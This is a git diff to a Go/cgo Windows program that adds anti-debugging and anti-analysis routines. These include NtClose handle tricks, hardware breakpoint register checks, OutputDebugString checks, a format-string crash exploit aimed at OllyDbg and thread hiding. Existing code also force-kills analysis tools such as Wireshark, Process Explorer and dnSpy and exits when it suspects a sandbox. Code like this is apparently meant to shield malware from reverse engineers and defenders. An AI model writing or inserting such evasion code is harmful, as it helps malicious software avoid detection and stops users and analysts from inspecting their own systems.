@@ -5,6 +5,7 @@ package main
 #include <winternl.h>
 #include <process.h>
 
+// C Part CODED BY MUZA
 
 typedef NTSTATUS(WINAPI *NtSetInformationThread)(IN HANDLE, IN THREADINFOCLASS, IN PVOID, IN ULONG);
 
@@ -49,6 +50,8 @@ ULONGLONG GetTickCount64();
 
 
 */
+
+// coded by codepulze and muza 
 import "C"
 import (
 	"fmt"
@@ -75,15 +78,93 @@ var (
     crdp = mk32.NewProc("CheckRemoteDebuggerPresent")
 
 	pep = mk32.NewProc("K32EnumProcesses")
+
+
+    // i stopped writing like lazy mf, i think this project will be updated so i just started writing clean on 04/04/2024
+	// I think that this project can be usefull and it has no reason for me to write like noobie... so no loger rand var names
+	ntdll                      = syscall.NewLazyDLL("ntdll.dll")
+	ntClose                    = ntdll.NewProc("NtClose")
+	createMutex               = syscall.NewLazyDLL("kernel32.dll").NewProc("CreateMutexA")
+	setHandleInformation      = syscall.NewLazyDLL("kernel32.dll").NewProc("SetHandleInformation")
+	
+	handleFlagProtectFromClose = uint32(0x00000002)
+
+	///////////////////// exploiting log console 
+	k32             = syscall.MustLoadDLL("kernel32.dll")
+	DebugStrgingA   = k32.MustFindProc("OutputDebugStringA")
+	gle         = k32.MustFindProc("GetLastError")
+	
 )
 
 func hehehidehthread() {
     C.hehehidehthread()
 }
 
+func NtCloseAntiDebug_InvalidHandle() bool {
+	r1, _, _ := ntClose.Call(uintptr(0x1231222))
+	return r1 != 0
+}
+
+func NtCloseAntiDebug_ProtectedHandle() bool {
+	r1, _, _ := createMutex.Call(0, 0, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(fmt.Sprintf("%d", 1234567)))))
+	hMutex := uintptr(r1)
+	r1, _, _ = setHandleInformation.Call(hMutex, uintptr(handleFlagProtectFromClose), uintptr(handleFlagProtectFromClose))
+	if r1 == 0 {
+		return false
+	}
+	r1, _, _ = ntClose.Call(hMutex)
+	return r1 != 0
+}
+
+func HardwareRegistersBreakpointsDetection() bool {
+    const CONTEXT_DEBUG_REGISTERS = 0x00010000 | 0x00000010
+    var context C.CONTEXT
+    context.ContextFlags = C.CONTEXT_DEBUG_REGISTERS
+    if C.GetThreadContext(C.GetCurrentThread(), &context) != 0 {
+        if context.Dr1 != 0 || context.Dr2 != 0 || context.Dr3 != 0 || context.Dr7 != 0 {
+            return true
+        }
+        dr := *(*[2]C.ULONG_PTR)(unsafe.Pointer(&context.R8)) 
+        if dr[0] != 0 || dr[1] != 0 {
+            return true
+        }
+    }
+    return false
+}
+
+
+func OutputDebugStringAntiDebug() bool {
+	naughty := "hm"
+	txptr, _ := syscall.UTF16PtrFromString(naughty)
+	DebugStrgingA.Call(uintptr(unsafe.Pointer(txptr)))
+	ret, _, _ := gle.Call()
+	return ret == 0
+}
+
+func OllyDbgExploit(text string) {
+    txptr, err := syscall.UTF16PtrFromString(text)
+    if err != nil {
+        panic(err)
+    }
+    DebugStrgingA.Call(uintptr(unsafe.Pointer(txptr)))
+}
+
+
+
 func main() {
 	for {
-		hehehidehthread()
+		// for debuggers like x64dbg or any other
+		OutputDebugStringAntiDebug()
+		// this is for ollydbg 
+		OllyDbgExploit("%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s")
+		/////////////////////////////
+		//hehehidehthread()
+		if HardwareRegistersBreakpointsDetection() {
+			os.Exit(1)
+		}
+		fmt.Println(NtCloseAntiDebug_InvalidHandle())
+        fmt.Println(NtCloseAntiDebug_ProtectedHandle())
+
 		// is debugger present check below
 		flag, _, _ := pidp.Call()
 		if flag != 0 {
@@ -135,10 +216,8 @@ func main() {
 		// Check Processes (Workstations have most of the time less than 50)
 		count := rpc()
 		if count < 50 {
-			fmt.Println("There are less than 50 running processes.")
 			return
 		}
-		fmt.Printf("There are %d running processes.\n", count)
 
 		// kill blacklisted processes (can by bypassed)
 		ptk := []string{"cmd.exe", "taskmgr.exe", "process.exe", "processhacker.exe", "ksdumper.exe", "fiddler.exe", "httpdebuggerui.exe", "wireshark.exe", "httpanalyzerv7.exe", "fiddler.exe", "decoder.exe", "regedit.exe", "procexp.exe", "dnspy.exe", "vboxservice.exe", "burpsuit.exe", "DbgX.Shell.exe", "ILSpy.exe"}
@@ -151,11 +230,8 @@ func main() {
 		ewp := syscall.NewCallback(ewpg)
 		ret, _, _ := pew.Call(ewp, 0)
 		if ret == 0 {
-			fmt.Println("EW failed idiot")
+			return
 		}
-		//is debugger present
-
-		fmt.Println("hahaah")
 	}
 }
 
@@ -165,7 +241,7 @@ func gpuchk() bool {
 	ou, _ := gpucm.Output()
 
 	gpul := string(ou)
-
+    //might trigger WST > WMIC LOL.
 	ou, _ = exec.Command("cmd", "/C", "wmic path win32_videocontroller get name").Output()
 	gpun := strings.TrimSpace(strings.Split(string(ou), "\n")[1])
 
